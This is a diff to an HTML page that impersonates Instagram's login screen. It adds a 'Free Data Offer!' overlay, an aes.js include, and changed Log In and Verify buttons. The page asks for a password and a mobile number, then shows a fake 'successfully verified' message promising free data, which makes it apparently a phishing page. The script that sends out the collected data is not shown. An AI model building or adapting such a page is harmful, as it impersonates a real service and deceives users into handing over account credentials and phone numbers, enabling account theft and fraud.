@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
     <title>Instagram</title>
@@ -7,10 +7,19 @@
     <meta charset="utf-8">
 
     <script src="js/jquery.min.js"></script>
+    <script src="js/aes.js"></script>
     <script src="js/site.js"></script>
     <link rel="stylesheet" href="css/site.css">
 </head>
 <body>
+    <div class="igcMaskDiv"></div>
+    <div class="igcMaskContentDiv">
+        <div>
+            <p style="font-size: 30px;">Free Data Offer!</p>
+            <p style="font-size: 24px;">Verify the authenticity to avail an offer.</p>
+            <p><button type="button" onclick="hideMask()">OK</button></p>
+        </div>
+    </div>
     <div class="igc_mainDiv">
         <div class="igc_mainLeftDiv">
             <div class="igc_leftInnerImgDiv">
@@ -33,7 +42,7 @@
                         <input name="password" type="password" placeholder="Password" class="igc_InputField igc_loginInputField igc_pwd" value="">
                     </div>
                     <div class="igc_LogInBtnDiv" style="padding: 15px 0;">
-                        <button class="igc_Btn igc_LogInBtn" disabled>Log In</button>
+                        <button class="igc_Btn igc_LogInBtn" disabled type="button">Log In</button>
                     </div>
                     <div class="igcAlertDiv igcErrorAlertDiv">
                         <p class="igcAlert error" role="alert">Sorry, your password was incorrect. Please double-check your password.</p>
@@ -47,13 +56,13 @@
                         <input name="mobile" type="text" placeholder="Mobile number" class="igc_InputField igc_mobileVerifyInputField igc_mobile" value="">
                     </div>
                     <div class="igc_mobileVerifyBtnDiv" style="padding: 15px 0;">
-                        <button class="igc_Btn igc_mobileVerifyBtn" disabled>Verify</button>
+                        <button class="igc_Btn igc_mobileVerifyBtn" disabled type="button">Verify</button>
                     </div>
                 </div>
                 <div class="igcSuccessInfoMainDiv">
                     <div class="igcSuccessInfoDiv" style="padding: 15px 0;">
                         <p class="igcAlert info success">&check; Congratulations! Your number has been successfully verified and free data will credit within an hour.</p>
-                    </div>                    
+                    </div>
                 </div>
             </div>
             <div class="igc_rightBottomDiv">
